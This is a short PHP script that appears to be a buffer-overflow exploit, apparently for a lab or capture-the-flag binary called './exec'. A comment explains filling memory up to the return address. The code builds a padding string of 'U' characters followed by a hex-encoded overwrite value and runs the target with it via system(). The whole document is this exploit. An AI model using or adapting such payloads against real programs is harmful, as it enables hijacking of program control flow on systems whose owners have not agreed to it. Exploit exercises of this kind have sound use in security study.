# Just fill up the proper allocated memory and the path until RETURN ADDR
$arg = "UUUUUUUUUUUUUUUUUUUU"."\x77\x49\x55\x55\x55\x55";
$cmd = "./exec ".$arg;
system($cmd);
